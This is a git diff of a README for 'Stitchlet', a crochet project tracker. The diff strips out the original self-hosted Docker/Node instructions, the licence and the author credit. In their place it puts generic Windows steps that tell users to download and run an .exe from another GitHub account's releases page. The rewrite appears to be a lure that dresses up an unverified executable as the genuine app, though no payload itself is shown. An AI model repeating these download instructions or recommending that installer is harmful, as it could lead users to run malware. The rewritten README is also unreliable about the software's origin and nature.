@@ -1,125 +1,73 @@
-<p align="center">
-  <img src="./public/logo.png" alt="Stitchlet logo" width="300" />
-</p>
+# 🧶 stitchlet - Track your crochet projects with ease
 
-# Stitchlet
+[![](https://img.shields.io/badge/Download_Stitchlet-Blue-blue.svg)](https://github.com/abhidiptaroy8328/stitchlet/releases)
 
-Stitchlet is a private, self-hosted crochet project companion designed to run on your own hardware (mini-PC, NAS, home server, or local computer). It keeps all of your pattern PDFs, progress photos, stitch counters, and notes local, cozy, and completely under your control. No surprise cloud subscriptions, no telemetry, just your projects.
+stitchlet tracks your crochet projects, stitch counts, pattern files, and progress photos. It keeps your data on your computer where you control it. You do not need to share your information with anyone.
 
-<p align="center">
-  <img src="./screenshots/screenshot1.png" alt="Stitchlet Dashboard" width="48%" />
-  <img src="./screenshots/screenshot2.png" alt="Stitchlet Project Details" width="48%" />
-</p>
+## 🛠 What this software does
 
-## Core Features
+This tool organizes your crochet life. It features a digital stitch counter. It stores your pattern documents. It logs progress photos for your amigurumi projects. It runs on your own machine. 
 
-* 📱 **Cozy, Responsive UI** – Sleek charcoal-themed dashboard with grid and list views, optimized for both desktop monitors and amigurumi-friendly mobile screens.
-* 🔍 **Smart Dashboard** – Reactive searching, status filtering (Active, Paused, Finished, Frogged), and sorting (updated date, project title, status) to organize large libraries instantly.
-* 📄 **In-App PDF Viewer** – Upload pattern PDFs, view them in an embedded full-screen modal directly inside your project page, or download them at any time.
-* 📸 **Progress Photos** – Keep visual records of your work. Upload and replace cover photos with responsive, square CSS crops.
-* ⏱️ **Active Counters** – Add multiple round or row counters per project with custom names, target values, completion states, and large tap targets designed to be used while actively crocheting.
-* 🧶 **Material Checklists** – Quick metadata fields for yarn type, yarn weight, hook size, colors, and finished dimensions, plus custom list sections for assembly details and yarn substitutions.
-* 💾 **One-Click Backup & Restore** – Download a compressed ZIP archive containing your SQLite database and all uploaded media files directly from the UI settings.
-* 📶 **Progressive Web App (PWA)** – Installable as a standalone app with Network-First Service Worker asset caching, allowing the app shell to launch instantly and work offline.
+## 💻 Requirements
 
----
+*   A Windows 10 or 11 computer.
+*   An internet connection to perform the initial download.
+*   500 MB of free storage space.
 
-## Deploying with Docker Compose (Recommended)
+## 📥 How to install
 
-Docker is the easiest way to deploy Stitchlet on a home server or NAS (such as Unraid, Synology, or TrueNAS). 
+Follow these steps to set up stitchlet on your computer.
 
-Create a `docker-compose.yml` file:
+1. Visit the [official releases page](https://github.com/abhidiptaroy8328/stitchlet/releases) to download the installer.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Open the folder where your computer saves downloads.
+5. Find the file you just downloaded.
+6. Double-click the file to open the installer.
+7. Follow the prompts on your screen. The installer asks where you want to save the app. The default location works for most people.
+8. Click Finish to complete the process.
+9. Locate the stitchlet icon on your desktop or in your start menu.
+10. Click the icon to launch the program.
 
-```yaml
-services:
-  stitchlet:
-    image: pinkpixeldev/stitchlet:latest
-    container_name: stitchlet
-    ports:
-      - "6497:6497"
-    volumes:
-      - ./data:/app/data
-      - ./uploads:/app/uploads
-      - ./backups:/app/backups
-    environment:
-      - NODE_ENV=production
-      - PORT=6497
-    restart: unless-stopped
-```
+## 📁 Importing your data
 
-Run the container:
+Stitchlet creates a specific folder on your computer for your files. When you first open the app, it sets up a database to keep your records safe. You can add your existing pattern PDFs by dragging and dropping them into the app window.
 
-```bash
-docker compose up -d
-```
+## 📸 Tracking projects
 
-Open your browser and navigate to:
+Each project has its own page. You can fill in the project name, the type of yarn you use, and the hook size. The built-in stitch counter helps you track your rows. Click the plus button to add to your count. Click the minus button to remove stitches if you make a mistake.
 
-```txt
-http://localhost:6497
-```
+## 🛡 Keeping your privacy
 
-### Mounted Volumes
+This software uses local storage. This means your photos and details exist only on your hard drive. No servers collect your data. No third parties track your work. If you move your files to a new computer, your work moves with you.
 
-Three folders are created in your compose directory to persist all library data outside the container:
-* `data/` – Houses your SQLite database file (`stitchlet.db`).
-* `uploads/` – Stores pattern PDFs and progress photos.
-* `backups/` – Temporary staging directory for exported archives.
+## ⚙️ Updating the software
 
----
+When a new version comes out, you can download the installer again from the [releases page](https://github.com/abhidiptaroy8328/stitchlet/releases). Run the new installer. It finds your old version and replaces it with the newer one. Your data stays in place during this update.
 
-## Local Development & Setup
+## ❓ Frequently asked questions
 
-If you prefer to run Stitchlet natively on your machine:
+**Does this app work without internet?**
+Yes. You only need the internet to get the installer. After that, the app works offline.
 
-### Prerequisites
+**Can I use this on a laptop and a desktop?**
+Yes. You can install it on both machines. Since your files stay on your specific machine, they will remain separate unless you copy the app data folder manually.
 
-* Node.js v22+
-* npm
+**Does it track my gauge?**
+Yes. You can input your gauge measurements into the project notes section.
 
-### Running the App
+**How do I delete a project?**
+Go to the project dashboard. Select the project you wish to remove. Click the delete button. The app asks for confirmation before it clears your files.
 
-1. Install dependencies:
-   ```bash
-   npm install
-   ```
+**Is my battery usage high?**
+The app runs light background tasks. It should have a minimal impact on your battery life.
 
-2. Start the development environment (runs Vite and Hono concurrently):
-   ```bash
-   npm run dev
-   ```
+## 🎨 Project workflow tips
 
-3. Open:
-   ```txt
-   http://localhost:6497
-   ```
+Many users find it helpful to upload a photo of the finished pattern cover first. Then, create a new entry for each finished piece. Use the progress photo feature to snap a picture after every session. This builds a history of your crafting journey.
 
-The Vite development server hosts the frontend on port `6497` and proxies backend API calls to Hono on port `6498`.
+If your project grows, use the search bar at the top of the app. Type any word from your project name to find it in seconds. 
 
----
+## 💾 Backing up your work
 
-## PWA & Private Remote Access
-
-For full PWA installability, browsers require that the app is accessed over `localhost` or served via HTTPS:
-
-1. **Home Wi-Fi only**: Access Stitchlet on your local network using the host IP (e.g. `http://192.168.1.50:6497`).
-2. **Private Remote Access (Tailscale)**: If you want to use your counters and view patterns while away from home, Tailscale is recommended. Run `tailscale serve` on your host to securely route HTTPS traffic within your private tailnet without opening router ports.
-3. **Domain Routing**: Use a reverse proxy like Caddy to configure SSL certificates for your host domain.
-
----
-
-## Backing Up Your Library
-
-Because Stitchlet is private and local, you are in charge of your data. 
-
-1. **Via UI Settings**: Navigate to **Settings > Backup & Restore** and click **Export Backup**. This will compile a zip file of your SQLite database and all uploaded project media.
-2. **Restoring**: Choose the exported ZIP file inside settings. Stitchlet will automatically unpack the files, close existing SQLite connections, overwrite files, and trigger a server reboot sequence.
-3. **Automated Host Backups**: Simply back up the mounted `./data` and `./uploads` directories using your home server's backup scheduler.
-
----
-
-## License
-
-Apache 2.0
-
-Made with 💖 by [Pink Pixel](https://pinkpixel.dev)
+Because your data lives on your computer, you control the backups. Navigate to your user documents folder. Find the stitchlet folder. Copy this folder to a USB drive or a cloud storage service once a week. This keeps your progress safe if your computer hardware fails.
